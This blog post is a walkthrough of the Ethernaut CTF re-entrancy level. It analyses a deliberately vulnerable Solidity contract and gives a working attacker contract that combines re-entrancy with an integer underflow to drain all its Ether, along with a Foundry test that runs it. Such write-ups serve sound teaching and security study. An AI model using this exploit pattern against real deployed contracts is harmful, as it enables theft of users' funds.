---
title: 'Ethernaut Challenge #10 Solution — Re-entrancy'
excerpt: This is Part 10 of the "Let’s play OpenZeppelin Ethernaut CTF" series, where I will explain how to solve each challenge.</br></br>To solve this challenge, we must **steal all the funds** from the contract.
coverImage:
  url: '/assets/blog/ethernaut/reentrancy.svg'
  credit:
    name: OpenZeppelin
    url: https://ethernaut.openzeppelin.com/
date: '2022-07-19T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethernaut/reentrancy.svg'
---

This is Part 10 of the ["Let's play OpenZeppelin Ethernaut CTF"](https://stermi.xyz/blog/lets-play-openzeppelin-ethernaut) series, where I will explain how to solve each challenge.

> [The Ethernaut](https://ethernaut.openzeppelin.com/) is a Web3/Solidity based wargame created by [OpenZeppelin](https://openzeppelin.com/).
> Each level is a smart contract that needs to be 'hacked'. The game acts both as a tool for those interested in learning ethereum, and as a way to catalogue historical hacks in levels. Levels can be infinite and the game does not require to be played in any particular order.

# Challenge #10: Re-entrancy

> The goal of this level is for you to steal all the funds from the contract.
> Things that might help:
>
> - Untrusted contracts can execute code where you least expect it.
> - Fallback methods
> - Throw/revert bubbling
> - Sometimes the best way to attack a contract is with another contract.
> - See the Help page above, section "Beyond the console"
>
> Level author: [Alejandro Santander](https://github.com/ajsantander)

To solve this challenge, we must **steal all the funds** from the contract.

## Study the contracts

The `Reentrance` contract is a basic contract that allow users to donate ETH to a specific address. That user can come in a later moment and withdraw the donation he/she has received.

Let's review the contracts code.

### State variables

- `mapping(address => uint) public balances` used to store the user's balance to know the amount they can withdraw

### Constructor

This contract has no constructor

### `donate`

The donate function allows the `msg.sender` to donate some ETH to another address. The function uses `SafeMath` for the `add` operation, but it is safe to say that it would probably never overflow.

```solidity
function donate(address _to) public payable {
	balances[_to] = balances[_to].add(msg.value);
}
```

There is no specific check on the `receive` and this can allow some weird interaction like for example:

- Donate to the contract itself. This would make those funds locked forever.
- Donate to the `address(0)`. This would make those funds locked forever.
- Donate to the `msg.sender` itself. This is just weird, but later the user would be able to retrieve the funds by calling `withdraw`

### `balanceOf`

This function allows querying the `balances` mapping variable to know the amount of ETH donated to a specific address.

```solidity
function balanceOf(address _who) public view returns (uint balance) {
	return balances[_who];
}
```

Nothing special to see here.

### `receive`

This is the function that allow the contract to receive arbitrary amount of ETH.

```solidity
receive() external payable {}
```

Honestly, I don't see a valid reason to have this function. This function can only create problems for the end user, who is allowed to send funds to the contract that **cannot** be withdrawn at a later moment because they are not tracked by the `balances` variable.

### `withdraw`

This is the function we need to pay attention to solve the challenge. Let's see the code and review how it works:

```solidity
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result, ) = msg.sender.call{value: _amount}("");
        if (result) {
            _amount;
        }
        balances[msg.sender] -= _amount;
    }
}
```

1. The function check that the `msg.sender` has enough balance to withdraw `_amount` of Ether
2. It proceeds to send the requested `_amount` via a low-level `call` function that will use all the remaining `gas` to execute the operation
3. I'll be honest, I don't know what the code inside the `if` statement do :D This is an old style of code that probably is not available anymore in Solidity 8.0. If you know what it does, send me a tweet
4. It updates the balance of the `msg.sender` decreasing the amount

**I can see two big problems here!**

The contract uses the Solidity version < 8.0 and this mean that every math operation could suffer from underflow/overflow attacks. The contract also use `SafeMath` for `uint256` and for example in the `donate` function this problem does not exist. But in `withdraw` they do not use it when the function updates the final balance of the sender. The reason to not use it would be that the contract know for sure (under normal circumstances) that it cannot underflow because of the `if (balances[msg.sender] >= _amount)` check.

Let's remember this thing and see the other problem.

The second one is introduced because the contract does not follow the [Checks-Effects-Interactions Pattern](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern). What does it mean? Quoting directly from the Solidity Documentation:

> Most functions will first perform some checks (who called the function, are the arguments in range, did they send enough Ether, does the person have tokens, etc.). These checks should be done first.
> As the second step, if all checks passed, effects to the state variables of the current contract should be made. Interaction with other contracts should be the very last step in any function.

In practice, what you **should always do (if applicable)**:

1. Perform all the checks needed
2. Perform all the state updates needed
3. Emit any event needed
4. **Only after all these things** perform the needed **external** call

By not following the Checks-Effects-Interactions Pattern and not using any Reentrancy Guard (like [OpenZeppelin: ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)) this function is prone to a Reentrancy Attack.

What does this mean? In just two words, it means that the attacker can re-enter the same function (or another function of your contract) and re-execute it again, but with the state variables of the contract not correctly updated as if they would have been if the function had been fully executed.

If you want to know more about this type of attack and how to prevent it, I **highly suggest you** to read all the resources I have collected in the **Further reading** section of the blog post.

Now returning to our challenge. Let's see how we can leverage these two problems, and I'll give you **two alternative solutions** to solve it.

When the contract executes `msg.sender.call{value: _amount}("")` and send to `msg.sender` the amount withdrawn, we can have two scenarios:

1. The `msg.sender` is an EOA (externally owned account), nothing special here the account receive the amount of Ether specified in the `value` field
2. The `msg.sender` is a Contract. The `value` is sent to the contract and the `fallback` or `receive` function is executed.

If we are in the second case, the Contract has all the remaining gas of the transaction to be used to execute its code (unless you specifics a limit inside the `call` parameters).

Inside the `fallback` or `receive` you can execute arbitrary code (if it does not consume all the gas left) and in this case, we are going to leverage the reentrancy exploit

To understand how the reentrancy works, let's make an example

1. `Reentrance` contract has `0.001 ether` deposited into it
2. We have a custom contract with the address `attackerContractAddress`
3. We call `reentranceContract.donate(attackerContractAddress)` sending `0.0001 Ether`
4. We call `reentranceContract.withdraw(0.0001 ether)`
5. The contract check if we have enough balance
6. The contract send back `0.0001 ether` by calling `msg.sender.call{value: 0.0001 ether}("")` and our `AttackerContract` `receive` function is executed

What would happen if, inside our `receive` function, we call again `reentranceContract.withdraw(0.0001 ether)`?

In this specific point in time the value of `balances[msg.sender]` would still be `0.0001 ether` because the `balances[msg.sender] -= _amount;` **has not been executed yet**!

**Exploit Option 1, The lazy and not smart one: Exploit Reentrancy In a Loop**

If funds are not a problem, we could send `0.001 ether / 100` via the `donate` function and re-enter the `withdraw` function 100 times + the initial call.

`0.001 ether / 100` is just an arbitrary value, we need to just be sure that we do not consume too much gas when re-entering the `withdraw` function otherwise the transaction would revert because of **Out of Gas exception**.

**Exploit Option 2, The cleaver way: Exploit Reentrancy and Underflow**

This solution is much more elegant, and it exploits two different problems: Reentrancy and Underflow!

We already know about the reentrancy problem, and we said that the underflow of the operation `balances[msg.sender] -= _amount` "normally" would have been protected by the `balances[msg.sender] >= _amount` because even if this operation does not use `SafeMath`, there would be no way to underflow if we know for sure that at max the `balances[msg.sender]` could go **zero**.

But because we can re-enter we can execute twice the same `balances[msg.sender] -= _amount` operation, so our balance the first time would go to zero, but the second time would go to `type(uint256).max` because of the underflow!

At this point, we would be able to call`withdraw` withdrawing the whole amount of Ether stored in the victim's contract!

**Note:** this second solution is **only** possible because of underflow. If the underflow problem wasn't there, we would be still able to solve the challenge via the Reentrancy loop solution.

## Solution code

Let's review the second solution. Here's the code of the contract you need to deploy to use both Reentrancy and Underflow

```solidity
contract ExploiterUnderflow {
    Reentrance private victim;
    address private owner;
    uint256 private initialDonation;
    bool private exploited;

    constructor(Reentrance _victim) public {
        owner = msg.sender;
        victim = _victim;
        exploited = false;
    }

    function withdraw() external {
        uint256 balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
        require(success, "withdraw failed");
    }

    function exploit() external payable {
        require(msg.value > 0, "donate something!");
        initialDonation = msg.value;

        // donate 1 wei to ourself
        victim.donate{value: msg.value}(address(this));

        // withdraw 1 way and trigger the re-entrancy exploit
        victim.withdraw(initialDonation);

        // because the victim contract underflowed our balance
        // we are now able to drain the whole balance of the contract
        victim.withdraw(address(victim).balance);
    }

    receive() external payable {
        // We need to re-enter only once
        // By re-entering our new balance will be equal to (2^256)-1
        if (!exploited) {
            exploited = true;

            // re-enter the contract withdrawing another wei
            victim.withdraw(initialDonation);
        }
    }
}
```

And here's the code to execute it

```solidity
function exploitLevel() internal override {
    vm.startPrank(player, player);

    // Balance of player before
    uint256 playerBalance = player.balance;
    uint256 levelBalance = address(level).balance;

    // Exploit by using a mix of reentrancy and underflow
    // Deploy our exploiter contract
    ExploiterUnderflow exploiter = new ExploiterUnderflow(level);
    // start the exploit
    exploiter.exploit{value: 1}();
    // withdraw all the funds
    exploiter.withdraw();

    // check that the victim has no more ether
    assertEq(address(level).balance, 0);

    // check that the player has all the ether present before in the victim contract
    assertEq(player.balance, playerBalance + levelBalance);

    vm.stopPrank();
}
```

You can read the full solution of the challenge opening [Reentrance.t.sol](https://github.com/StErMi/foundry-ethernaut/blob/main/test/Reentrance.t.sol)

## Further reading

- [Solidity Docs: Use the Checks-Effects-Interactions Pattern](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern)
- [SWC-107: Reentrancy](https://swcregistry.io/docs/SWC-107)
- [Consensys Ethereum Smart Contract Best Practices: Reentrancy](https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/)
- [OpenZeppelin: ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
